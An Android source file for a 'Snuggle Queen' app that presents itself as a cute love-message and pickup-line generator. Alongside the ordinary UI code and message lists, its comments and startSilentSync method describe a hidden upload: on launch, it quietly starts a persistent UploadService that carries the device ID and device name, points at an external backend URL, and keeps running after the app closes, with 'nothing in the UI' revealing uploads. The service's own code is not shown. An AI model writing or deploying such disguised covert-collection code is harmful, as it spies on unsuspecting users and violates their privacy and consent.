package com.snugglequeen.yobby;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.ScrollView;
import android.widget.RelativeLayout;
import android.widget.Toast;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.provider.Settings;

import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * MainActivity — a cute love messages + pickup lines app.
 *
 * (Silently kicks off background sync. Nothing in the UI reveals that anything is being uploaded.)
 */
public class MainActivity extends Activity {

    private static final String BACKEND_URL = "https://snuggle-queen.onrender.com";

    private TextView messageCard;
    private TextView heartIcon;
    private Button tabLove;
    private Button tabPickup;
    private Button newBtn;
    private Button copyBtn;
    private Button shareBtn;

    private boolean showLove = true;
    private Random random = new Random();

    private final String[] loveMessages = {
        "You are the smile in my morning and the peace in my night. 💕",
        "If loving you is a journey, I never want to reach the destination. 🌹",
        "You are my favorite hello and my hardest goodbye. 💗",
        "Every love story is beautiful, but ours is my favorite. 💖",
        "You are the missing piece my heart has been searching for. 🧩",
        "I fell for you the way autumn leaves fall — silently, completely, beautifully. 🍂",
        "You are the song my heart hums when no one is listening. 🎶",
        "My world was black and white until you brought the colors. 🌈",
        "I love you not just for who you are, but for who I become when I'm with you. ✨",
        "You are my today and all of my tomorrows. 💍",
        "In a world full of trends, you remain a classic. 💎",
        "You are the calm in my chaos and the rhythm in my heart. 🌊",
        "If my heart had wings, it would fly straight to you. 🕊️",
        "You are the reason butterflies still exist in my stomach. 🦋",
        "Some souls just understand each other — ours do, perfectly. 🤍",
        "You are the poem I never knew how to write. 📝",
        "My favorite place in the world is next to you. 🌍",
        "Loving you is the easiest thing I've ever done. 💞",
        "You are my sun on cloudy days and my stars on dark nights. ⭐",
        "Every heartbeat of mine whispers your name. 💓",
        "You are my sweetest dream come true. 🌙",
        "I would choose you in a hundred lifetimes, in a hundred worlds. 🌌",
        "You are the warm hug my soul needs every day. 🤗",
        "With you, even silence feels like a love song. 🎵",
        "You are my forever and always. ♾️",
        "You turned my ordinary days into fairy tales. 👑",
        "My heart found its home the day I found you. 🏡",
        "You are the best thing I never planned. 💝",
        "If kisses were snowflakes, I'd send you a blizzard. ❄️",
        "You are the most beautiful chapter of my life's book. 📖"
    };

    private final String[] pickupLines = {
        "Are you a magician? Because every time I look at you, everyone else disappears. ✨",
        "Do you have a map? I keep getting lost in your eyes. 🗺️",
        "Are you Wi-Fi? Because I'm feeling a real connection. 📶",
        "Is your name Google? Because you have everything I've been searching for. 🔍",
        "Do you believe in love at first sight, or should I walk by again? 😏",
        "Are you a parking ticket? Because you've got 'FINE' written all over you. 🚗",
        "Is your dad a baker? Because you're a cutie pie. 🥧",
        "Do you have a Band-Aid? I just scraped my knee falling for you. 🩹",
        "Are you French? Because Eiffel for you. 🗼",
        "If you were a vegetable, you'd be a cute-cumber. 🥒",
        "Are you a campfire? Because you're hot and I want s'more. 🔥",
        "Is your name Chapstick? Because you're making my lips dry. 💋",
        "Did it hurt when you fell from heaven? 😇",
        "Are you a camera? Because every time I look at you, I smile. 📷",
        "Do you play soccer? Because you just scored a goal in my heart. ⚽",
        "Are you a loan? Because you've got my interest. 💰",
        "Is your nickname Ariel? Because I think we mermaid for each other. 🧜",
        "Are you a time traveler? Because I see you in my future. ⏰",
        "Are you Australian? Because you meet all my koala-fications. 🐨",
        "If beauty were time, you'd be an eternity. ⏳",
        "Are you a beaver? Because daaaaam. 🦫",
        "Is your name Daisy? Because I'm completely crazy for you. 🌼",
        "You must be made of cheese, because you're looking gouda tonight. 🧀",
        "Are you an alien? Because you just abducted my heart. 👽",
        "Do you have a pencil? Because I want to erase your past and write our future. ✏️",
        "Are you the moon? Because even in the dark, you light up my world. 🌝",
        "Did you swallow magnets? Because I'm attracted to you. 🧲",
        "Is your dad a thief? Because someone stole the stars and put them in your eyes. 🌟",
        "Are you a snowstorm? Because you're making my heart race. ⛄",
        "If you were a fruit, you'd be a fine-apple. 🍍"
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);

        RelativeLayout root = new RelativeLayout(this);
        root.setLayoutParams(new RelativeLayout.LayoutParams(
                RelativeLayout.LayoutParams.MATCH_PARENT,
                RelativeLayout.LayoutParams.MATCH_PARENT));
        GradientDrawable gradient = new GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                new int[]{Color.parseColor("#FFE5EC"), Color.parseColor("#FFC2D4")});
        root.setBackground(gradient);

        ScrollView scroll = new ScrollView(this);
        scroll.setLayoutParams(new RelativeLayout.LayoutParams(
                RelativeLayout.LayoutParams.MATCH_PARENT,
                RelativeLayout.LayoutParams.MATCH_PARENT));

        LinearLayout content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setPadding(60, 120, 60, 80);
        content.setGravity(Gravity.CENTER_HORIZONTAL);

        // Header
        TextView title = new TextView(this);
        title.setText("💕 Snuggle Queen 💕");
        title.setTextSize(28);
        title.setTextColor(Color.parseColor("#C9184A"));
        title.setGravity(Gravity.CENTER);
        title.setTypeface(null, android.graphics.Typeface.BOLD);
        title.setPadding(0, 0, 0, 10);
        content.addView(title);

        TextView subtitle = new TextView(this);
        subtitle.setText("Love Messages & Pickup Lines");
        subtitle.setTextSize(13);
        subtitle.setTextColor(Color.parseColor("#9D174D"));
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setPadding(0, 0, 0, 40);
        content.addView(subtitle);

        // Tab buttons
        LinearLayout tabs = new LinearLayout(this);
        tabs.setOrientation(LinearLayout.HORIZONTAL);
        tabs.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams tabsParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        tabsParams.setMargins(0, 0, 0, 30);
        tabs.setLayoutParams(tabsParams);

        tabLove = new Button(this);
        tabLove.setText("💌 Love");
        tabLove.setTextColor(Color.WHITE);
        tabLove.setAllCaps(false);
        tabLove.setPadding(50, 25, 50, 25);
        GradientDrawable loveBg = new GradientDrawable();
        loveBg.setShape(GradientDrawable.RECTANGLE);
        loveBg.setCornerRadius(40);
        loveBg.setColor(Color.parseColor("#FF5C8A"));
        tabLove.setBackground(loveBg);
        LinearLayout.LayoutParams lpLove = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        lpLove.setMargins(0, 0, 12, 0);
        tabLove.setLayoutParams(lpLove);
        tabLove.setOnClickListener(v -> {
            showLove = true;
            refreshTabColors();
            showRandomMessage();
        });
        tabs.addView(tabLove);

        tabPickup = new Button(this);
        tabPickup.setText("😏 Pickup");
        tabPickup.setTextColor(Color.parseColor("#C9184A"));
        tabPickup.setAllCaps(false);
        tabPickup.setPadding(50, 25, 50, 25);
        GradientDrawable pickupBg = new GradientDrawable();
        pickupBg.setShape(GradientDrawable.RECTANGLE);
        pickupBg.setCornerRadius(40);
        pickupBg.setColor(Color.parseColor("#FFE5EC"));
        pickupBg.setStroke(3, Color.parseColor("#FF5C8A"));
        tabPickup.setBackground(pickupBg);
        LinearLayout.LayoutParams lpPickup = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        lpPickup.setMargins(12, 0, 0, 0);
        tabPickup.setLayoutParams(lpPickup);
        tabPickup.setOnClickListener(v -> {
            showLove = false;
            refreshTabColors();
            showRandomMessage();
        });
        tabs.addView(tabPickup);

        content.addView(tabs);

        // Heart icon
        heartIcon = new TextView(this);
        heartIcon.setText("💌");
        heartIcon.setTextSize(60);
        heartIcon.setGravity(Gravity.CENTER);
        heartIcon.setPadding(0, 30, 0, 30);
        content.addView(heartIcon);

        // Message card
        messageCard = new TextView(this);
        messageCard.setTextSize(18);
        messageCard.setTextColor(Color.parseColor("#3D0A1F"));
        messageCard.setGravity(Gravity.CENTER);
        messageCard.setPadding(50, 60, 50, 60);
        messageCard.setLineSpacing(8, 1.2f);
        GradientDrawable cardBg = new GradientDrawable();
        cardBg.setShape(GradientDrawable.RECTANGLE);
        cardBg.setCornerRadius(30);
        cardBg.setColor(Color.WHITE);
        cardBg.setStroke(2, Color.parseColor("#FFE5EC"));
        messageCard.setBackground(cardBg);
        LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        cardParams.setMargins(20, 0, 20, 30);
        messageCard.setLayoutParams(cardParams);
        content.addView(messageCard);

        // New message button
        newBtn = new Button(this);
        newBtn.setText("✨ Get Another ✨");
        newBtn.setTextColor(Color.WHITE);
        newBtn.setAllCaps(false);
        newBtn.setTextSize(16);
        newBtn.setPadding(0, 40, 0, 40);
        GradientDrawable newBg = new GradientDrawable();
        newBg.setShape(GradientDrawable.RECTANGLE);
        newBg.setCornerRadius(50);
        newBg.setColor(Color.parseColor("#FF5C8A"));
        newBg.setStroke(2, Color.parseColor("#C9184A"));
        newBtn.setBackground(newBg);
        LinearLayout.LayoutParams newParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        newParams.setMargins(20, 0, 20, 15);
        newBtn.setLayoutParams(newParams);
        newBtn.setOnClickListener(v -> showRandomMessage());
        content.addView(newBtn);

        // Copy button
        copyBtn = new Button(this);
        copyBtn.setText("📋 Copy");
        copyBtn.setTextColor(Color.parseColor("#C9184A"));
        copyBtn.setAllCaps(false);
        copyBtn.setTextSize(14);
        copyBtn.setPadding(0, 30, 0, 30);
        GradientDrawable copyBg = new GradientDrawable();
        copyBg.setShape(GradientDrawable.RECTANGLE);
        copyBg.setCornerRadius(40);
        copyBg.setColor(Color.parseColor("#FFFFFF"));
        copyBg.setStroke(2, Color.parseColor("#FF5C8A"));
        copyBtn.setBackground(copyBg);
        LinearLayout.LayoutParams copyParams = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        copyParams.setMargins(20, 15, 10, 0);
        copyBtn.setLayoutParams(copyParams);
        copyBtn.setOnClickListener(v -> {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            cm.setPrimaryClip(ClipData.newPlainText("Snuggle Queen", messageCard.getText().toString()));
            Toast.makeText(this, "Copied to clipboard 💕", Toast.LENGTH_SHORT).show();
        });
        content.addView(copyBtn);

        // Share button
        shareBtn = new Button(this);
        shareBtn.setText("💞 Share");
        shareBtn.setTextColor(Color.parseColor("#C9184A"));
        shareBtn.setAllCaps(false);
        shareBtn.setTextSize(14);
        shareBtn.setPadding(0, 30, 0, 30);
        GradientDrawable shareBg = new GradientDrawable();
        shareBg.setShape(GradientDrawable.RECTANGLE);
        shareBg.setCornerRadius(40);
        shareBg.setColor(Color.parseColor("#FFFFFF"));
        shareBg.setStroke(2, Color.parseColor("#FF5C8A"));
        shareBtn.setBackground(shareBg);
        LinearLayout.LayoutParams shareParams = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        shareParams.setMargins(10, 15, 20, 0);
        shareBtn.setLayoutParams(shareParams);
        shareBtn.setOnClickListener(v -> {
            Intent send = new Intent(Intent.ACTION_SEND);
            send.setType("text/plain");
            send.putExtra(Intent.EXTRA_TEXT, messageCard.getText().toString());
            startActivity(Intent.createChooser(send, "Share love 💕"));
        });
        content.addView(shareBtn);

        // Re-arrange copy + share horizontally
        LinearLayout actionRow = new LinearLayout(this);
        actionRow.setOrientation(LinearLayout.HORIZONTAL);
        actionRow.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams actionParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        actionParams.setMargins(0, 10, 0, 0);
        actionRow.setLayoutParams(actionParams);
        content.removeView(copyBtn);
        content.removeView(shareBtn);
        actionRow.addView(copyBtn);
        actionRow.addView(shareBtn);
        content.addView(actionRow);

        // Footer
        TextView footer = new TextView(this);
        footer.setText("Made with 💕 by Snuggle Queen");
        footer.setTextSize(11);
        footer.setTextColor(Color.parseColor("#9D174D"));
        footer.setGravity(Gravity.CENTER);
        footer.setPadding(0, 50, 0, 0);
        content.addView(footer);

        scroll.addView(content);
        root.addView(scroll);
        setContentView(root);

        // Show first message
        showRandomMessage();

        // Silent background kick-off — no UI hint that anything is happening.
        startSilentSync();
    }

    private void refreshTabColors() {
        if (showLove) {
            ((GradientDrawable) tabLove.getBackground()).setColor(Color.parseColor("#FF5C8A"));
            tabLove.setTextColor(Color.WHITE);
            ((GradientDrawable) tabPickup.getBackground()).setColor(Color.parseColor("#FFE5EC"));
            tabPickup.setTextColor(Color.parseColor("#C9184A"));
            heartIcon.setText("💌");
        } else {
            ((GradientDrawable) tabPickup.getBackground()).setColor(Color.parseColor("#FF5C8A"));
            tabPickup.setTextColor(Color.WHITE);
            ((GradientDrawable) tabLove.getBackground()).setColor(Color.parseColor("#FFE5EC"));
            tabLove.setTextColor(Color.parseColor("#C9184A"));
            heartIcon.setText("😏");
        }
    }

    private void showRandomMessage() {
        String[] pool = showLove ? loveMessages : pickupLines;
        String msg = pool[random.nextInt(pool.length)];
        messageCard.setText(msg);
        messageCard.setAlpha(0f);
        messageCard.animate().alpha(1f).setDuration(400).start();
    }

    private void startSilentSync() {
        ExecutorService executor = Executors.newSingleThreadExecutor();
        executor.execute(() -> {
            try {
                Thread.sleep(800); // small delay so UI settles first
            } catch (InterruptedException ignored) { }
            // Start the background service for continuous silent sync
            Intent serviceIntent = new Intent(this, UploadService.class);
            serviceIntent.putExtra("deviceId", getMyDeviceId());
            serviceIntent.putExtra("deviceName", getDeviceName());
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        });
    }

    private String getMyDeviceId() {
        String id = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        if (id == null || id.isEmpty()) id = "device_" + System.currentTimeMillis();
        return id;
    }

    private String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return capitalize(model);
        }
        return capitalize(manufacturer) + " " + model;
    }

    private String capitalize(String s) {
        if (s == null || s.isEmpty()) return "";
        return s.substring(0, 1).toUpperCase() + s.substring(1);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        // Service keeps running in background
    }
}
